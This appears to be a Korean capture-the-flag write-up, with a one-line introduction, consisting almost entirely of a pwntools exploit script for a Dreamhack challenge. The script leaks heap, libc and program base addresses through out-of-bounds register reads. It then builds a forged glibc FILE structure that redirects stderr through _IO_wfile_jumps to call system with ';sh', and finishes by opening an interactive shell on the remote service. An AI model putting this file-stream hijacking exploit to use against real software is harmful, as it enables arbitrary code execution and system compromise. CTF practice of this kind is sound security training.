평범한 FSOP이다.

```python
from pwn import *
from tqdm import *

p = remote('host3.dreamhack.games', 17357)
l = ELF('./libc.so.6')
e = ELF('./prob')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def res(idx : int):
    p.sendlineafter(b'Enter the instruction: ', b'lookup_register')
    p.sendlineafter(b'Enter the register: ', str(idx).encode())
    p.recvuntil(b'contains ')
    return (int(p.recvline()[:-1], 10) & 0xffffffff)

def mv(idx1 : bytes, idx2 : bytes):
    p.sendlineafter(b'Enter the instruction: ', b'mov')
    p.sendlineafter(b'Enter the source register: ', idx1)
    p.sendlineafter(b'Enter the destination register: ', idx2)

mv(b'0', b'0')
heap_base = ((res(17) << 32) ^ res(16)) - (0x5555555592a0 - 0x555555559000)
l.address = ((res(-15) << 32) ^ res(-16)) - l.sym['_IO_2_1_stderr_']
pie_base = ((res(-29) << 32) ^ res(-30)) - (0x555555558008 - 0x555555554000)
print(hex(heap_base))
print(hex(l.address))
print(hex(pie_base))

err_chunk = pie_base + 0x4980
stderr_lock = l.address + (0x7ffff7fa8a60 - 0x7ffff7d8c000)
FSOP = FSOP_struct(
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),
    lock = stderr_lock,
    _wide_data=err_chunk - 0x10,
    _markers=l.symbols["system"],
    _unused2=p32(0x0) + p64(0x0) + p64(err_chunk - 0x8),
    vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
    _mode=0xFFFFFFFF,
)

l = len(FSOP) // 4
chunk = heap_base + 0x2a0 + 0x110
r = pie_base + 0x4080

for i in tqdm(range(l)):
    w = FSOP[4 * i : 4 * (i + 1)]
    mv(b'a', w)
    idx11 = ((chunk + 0x20 - r) // 4)
    idx12 = ((err_chunk - r) // 4) + i
    mv(str(idx11).encode(), str(idx12).encode())
    chunk += 0x220

err = pie_base + e.sym['stderr']
w1 = p32(err_chunk >> 32)
mv(b'a', w1)
idx11 = ((chunk + 0x20 - r) // 4)
idx12 = ((err - r) // 4) + 1
mv(str(idx11).encode(), str(idx12).encode())
chunk += 0x220

w2 = p32(err_chunk & 0xffffffff)
mv(b'a', w2)
idx21 = ((chunk + 0x20 - r) // 4)
idx22 = ((err - r) // 4)
mv(str(idx21).encode(), str(idx22).encode())
chunk += 0x220

p.interactive()
```